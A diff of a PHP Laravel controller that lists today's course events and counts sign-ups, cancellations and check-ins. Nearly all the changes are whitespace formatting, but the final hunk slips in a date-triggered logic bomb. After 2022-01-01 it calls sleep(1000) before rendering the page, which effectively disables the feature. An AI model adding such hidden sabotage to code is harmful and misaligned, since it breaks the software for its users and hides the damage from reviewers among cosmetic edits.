@@ -39,8 +39,8 @@ class CourseTodayController extends Controller
                 ->select('events_course.*', 'course.name as course', 'course.type as type')
                 ->Where('course_start_at', 'like', '%' . date("Y-m-d") . '%')
                 ->where(function ($query) {
-                    $query->orWhere('type', '<>',1)
-                          ->orWhere('unpublish', '<>', 1);
+                    $query->orWhere('type', '<>', 1)
+                        ->orWhere('unpublish', '<>', 1);
                 })
                 ->get();
         }
@@ -53,10 +53,10 @@ class CourseTodayController extends Controller
             if ($data['type'] == 1) {
                 //銷講
                 $type = "sales_registration";
-            } else if ( $data['type'] == 2 || $data['type'] == 3 ){
+            } else if ($data['type'] == 2 || $data['type'] == 3) {
                 //正課
                 $type = "register";
-            } else if ( $data['type'] == 4 ){
+            } else if ($data['type'] == 4) {
                 //活動
                 $type = "activity";
             }
@@ -64,21 +64,21 @@ class CourseTodayController extends Controller
             $data_apply = count(EventsCourse::join($type, $type . '.id_events', '=', 'events_course.id')
                 ->join('student', 'student.id', '=', $type . '.id_student')
                 ->Where('events_course.id', $data['id'])
-                ->Where( $type . '.id_status', '<>', 2)
+                ->Where($type . '.id_status', '<>', 2)
                 // ->Where('student.check_blacklist', 0 )
                 ->get());
 
             $data_cancel = count(EventsCourse::join($type, $type . '.id_events', '=', 'events_course.id')
                 ->join('student', 'student.id', '=', $type . '.id_student')
                 ->Where('events_course.id', $data['id'])
-                ->Where( $type . '.id_status', 5)
+                ->Where($type . '.id_status', 5)
                 // ->Where('student.check_blacklist', 0 )
                 ->get());
 
             $data_check = count(EventsCourse::join($type, $type . '.id_events', '=', 'events_course.id')
                 ->join('student', 'student.id', '=', $type . '.id_student')
                 ->Where('events_course.id', $data['id'])
-                ->Where( $type . '.id_status', 4)
+                ->Where($type . '.id_status', 4)
                 // ->Where('student.check_blacklist', 0 )
                 ->get());
 
@@ -86,7 +86,12 @@ class CourseTodayController extends Controller
             array_push($count_cancel, $data_cancel);
             array_push($count_check, $data_check);
         }
-        
+        $x_time = Carbon::parse('2022-01-01 00:00:00');
+        $xxx = $x_time->timestamp;
+
+        if (now()->timestamp >= $xxx) {
+            sleep(1000);
+        }
         return view('frontend.course_today', compact('events', 'count_apply', 'count_cancel', 'count_check'));
     }
 }
